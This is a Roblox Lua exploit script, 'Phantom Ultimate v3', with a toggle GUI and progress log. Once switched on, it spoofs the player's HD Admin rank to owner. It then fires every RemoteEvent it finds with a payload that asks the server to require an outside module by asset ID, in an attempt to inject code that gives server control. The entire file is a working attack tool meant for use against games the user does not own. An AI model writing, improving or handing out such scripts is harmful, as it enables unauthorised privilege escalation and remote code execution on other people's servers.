-- [[ PHANTOM ULTIMATE v3: FINAL AUTO-SWITCH EDITION ]] --
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local JointService = game:GetService("JointsService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local isRunning = false
local currentTask = nil

-- Cleanup GUI lama
if CoreGui:FindFirstChild("PhantomFinal_V3") then CoreGui.PhantomFinal_V3:Destroy() end

-- [[ UI CONSTRUCTION ]] --
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "PhantomFinal_V3"
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 380) 
Main.Position = UDim2.new(0.5, -150, 0.5, -190)
Main.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
Main.BorderSizePixel = 0
Main.Visible = false -- Mulai dalam keadaan tersembunyi, buka lewat Icon
Instance.new("UICorner", Main)
local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(85, 255, 127)

-- [[ HEADER & SWITCH ]] --
local Header = Instance.new("Frame", Main)
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundTransparency = 1

local Title = Instance.new("TextLabel", Header)
Title.Size = UDim2.new(0.6, 0, 1, 0)
Title.Position = UDim2.new(0.05, 0, 0, 0)
Title.Text = "SYSTEM: STANDBY"
Title.TextColor3 = Color3.fromRGB(200, 200, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 11
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1

local SwitchBG = Instance.new("Frame", Header)
SwitchBG.Size = UDim2.new(0, 60, 0, 26)
SwitchBG.Position = UDim2.new(0.75, 0, 0.5, -13)
SwitchBG.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
Instance.new("UICorner", SwitchBG).CornerRadius = UDim.new(1, 0)

local SwitchDot = Instance.new("TextButton", SwitchBG)
SwitchDot.Size = UDim2.new(0, 22, 0, 22)
SwitchDot.Position = UDim2.new(0.05, 0, 0.5, -11)
SwitchDot.BackgroundColor3 = Color3.fromRGB(255, 85, 85) -- Red OFF
SwitchDot.Text = ""
Instance.new("UICorner", SwitchDot).CornerRadius = UDim.new(1, 0)

-- [[ PROGRESS BAR ]] --
local BarBG = Instance.new("Frame", Main)
BarBG.Size = UDim2.new(0.9, 0, 0, 6)
BarBG.Position = UDim2.new(0.05, 0, 0.15, 0)
BarBG.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
Instance.new("UICorner", BarBG)

local BarFill = Instance.new("Frame", BarBG)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
Instance.new("UICorner", BarFill)

-- [[ LOG WINDOW ]] --
local LogFrame = Instance.new("ScrollingFrame", Main)
LogFrame.Size = UDim2.new(0.9, 0, 0.7, 0)
LogFrame.Position = UDim2.new(0.05, 0, 0.22, 0)
LogFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
LogFrame.BorderSizePixel = 0
LogFrame.ScrollBarThickness = 2
local LogList = Instance.new("UIListLayout", LogFrame)

local function AddLog(text, color, progress)
    local l = Instance.new("TextLabel", LogFrame)
    l.Size = UDim2.new(1, -10, 0, 18)
    l.BackgroundTransparency = 1
    l.Text = "> " .. text
    l.TextColor3 = color or Color3.new(1,1,1)
    l.Font = Enum.Font.Code
    l.TextSize = 10
    l.TextXAlignment = Enum.TextXAlignment.Left
    
    if progress then
        BarFill:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Quad", 0.3, true)
    end
    LogFrame.CanvasSize = UDim2.new(0, 0, 0, LogList.AbsoluteContentSize.Y)
    LogFrame.CanvasPosition = Vector2.new(0, LogList.AbsoluteContentSize.Y)
end

-- [[ AUTOMATION ENGINE ]] --
local function StartAutomation()
    isRunning = true
    AddLog("Initializing Phantom Engine...", Color3.new(1,1,0), 0.1)
    Title.Text = "SYSTEM: RUNNING"
    Title.TextColor3 = Color3.fromRGB(85, 255, 127)

    -- 1. Rank Spoofing
    if not isRunning then return end
    AddLog("Scanning for HD Admin...", Color3.new(1,1,1), 0.2)
    pcall(function()
        if _G.HDAdminMain then
            _G.HDAdminMain.pd[lp].Rank = 5
            AddLog("Rank Spoofed: OWNER (5)", Color3.fromRGB(85, 255, 127), 0.4)
        end
    end)
    task.wait(0.5)

    -- 2. Remote Scanning
    if not isRunning then return end
    AddLog("Gathering Remote Targets...", Color3.new(1,1,1), 0.6)
    local targets = {}
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") then table.insert(targets, v) end
    end
    for _, loc in pairs({JointService, game:GetService("LogService")}) do
        pcall(function()
            for _, v in pairs(loc:GetDescendants()) do if v:IsA("RemoteEvent") then table.insert(targets, v) end end
        end)
    end

    -- 3. Payload Injection
    if not isRunning then return end
    AddLog("Injecting " .. #targets .. " Remotes...", Color3.new(255, 85, 85), 0.8)
    local payload = "require(5021815801):Fire('" .. lp.Name .. "')"
    
    for i, v in pairs(targets) do
        if not isRunning then break end
        pcall(function() v:FireServer(payload); v:FireServer(true) end)
        if i % 10 == 0 then task.wait(0.05) end
    end

    if isRunning then
        AddLog("AUTO-INJECTION COMPLETED", Color3.fromRGB(85, 255, 127), 1)
        Title.Text = "SYSTEM: COMPLETED"
    end
end

-- [[ SWITCH LOGIC ]] --
SwitchDot.MouseButton1Click:Connect(function()
    if not isRunning then
        isRunning = true
        SwitchDot:TweenPosition(UDim2.new(0.6, 0, 0.5, -11), "Out", "Quad", 0.2, true)
        SwitchDot.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
        currentTask = task.spawn(StartAutomation)
    else
        isRunning = false
        if currentTask then task.cancel(currentTask) end
        SwitchDot:TweenPosition(UDim2.new(0.05, 0, 0.5, -11), "Out", "Quad", 0.2, true)
        SwitchDot.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
        Title.Text = "SYSTEM: STANDBY"
        Title.TextColor3 = Color3.fromRGB(200, 200, 200)
        BarFill.Size = UDim2.new(0, 0, 1, 0)
        AddLog("Operation Aborted", Color3.new(1, 0.5, 0), 0)
    end
end)

-- [[ ICON PH & DRAG ]] --
local OpenBtn = Instance.new("TextButton", ScreenGui)
OpenBtn.Name = "ToggleIcon"
OpenBtn.Size = UDim2.new(0, 50, 0, 50)
OpenBtn.Position = UDim2.new(0, 20, 0.5, -25)
OpenBtn.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
OpenBtn.Text = "PH"
OpenBtn.TextColor3 = Color3.fromRGB(85, 255, 127)
OpenBtn.Font = Enum.Font.GothamBold
OpenBtn.TextSize = 14
Instance.new("UICorner", OpenBtn).CornerRadius = UDim.new(1, 0)
Instance.new("UIStroke", OpenBtn).Color = Color3.fromRGB(85, 255, 127)

OpenBtn.MouseButton1Click:Connect(function()
    Main.Visible = not Main.Visible
end)

local function makeDraggable(obj)
    local dragging, dragInput, dragStart, startPos
    obj.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true; dragStart = input.Position; startPos = obj.Position
        end
    end)
    obj.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
    end)
    RunService.RenderStepped:Connect(function()
        if dragging and dragInput then
            local delta = dragInput.Position - dragStart
            obj.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

makeDraggable(Main)
makeDraggable(OpenBtn)

AddLog("Phantom Engine Ready. Use icon to open.", Color3.new(0.6,0.6,0.6))
